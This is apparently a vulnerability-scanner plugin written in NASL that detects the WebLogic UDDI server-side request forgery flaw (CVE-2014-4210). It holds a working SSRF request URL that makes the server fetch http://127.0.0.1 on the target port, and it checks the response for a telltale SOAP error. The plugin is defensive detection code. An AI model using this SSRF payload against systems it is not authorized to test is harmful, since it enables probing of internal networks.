############################################################
# Author: shiyunshu
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799236);
 name = "WebLogic SSRF (CVE-2014-4210)";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");  
 script_set_attribute(attribute:"description", value:"Weblogic is a middleware of JavaEE architecture, which provides a uddi service. This service is the default function, and there are risks such as XSS and SSRF vulnerabilities. SSRF (server-side Request Forgery) is a security vulnerability that is constructed by an attacker to form a request initiated by the server. In general, the target of SSRF attack is the internal system that cannot be accessed from the external network. Many web applications provide the function of getting data from other servers. Using the URL specified by the user, the web application can obtain the picture, download the file, read the content of the file and so on. If this function is used by malicious users, the defective web application can be used as a proxy to attack remote and local servers.");
 script_set_attribute(attribute:"solution", value:"Remove access to UDDI functionality, unless there is business case to support exposing it. Failing that, ensure that the July 2014 CPU has been applied.");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 7001);
 exit(0);
}


#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:",port,"&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search");
	
	req = http_send_recv3(method: "GET", port: port, item: url, add_headers: make_array("User_Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0","Content-Type", "application/x-www-form-urlencoded" ));
	if( req[2] == NULL) exit(0);
	con = url + req[1] + req[2];
	if( "200 O">< req[0] && "weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://127.0.0.1:" >< req[2] && "which did not have a valid SOAP" >< req[2] ){
	  	if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
    }
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:",port,"&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search");
	res = http_send_recv3(method: "GET", port: port, item: url, add_headers: make_array("User_Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0","Content-Type", "application/x-www-form-urlencoded" ));
	req = http_last_sent_request();
    ssl_req = https_req_get(port:port , request:req);
	if( ssl_req == NULL) exit(0);
	con = url + ssl_req;
	if( "200 O"><ssl_req && "weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://127.0.0.1:" ><ssl_req && "which did not have a valid SOAP"><ssl_req){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}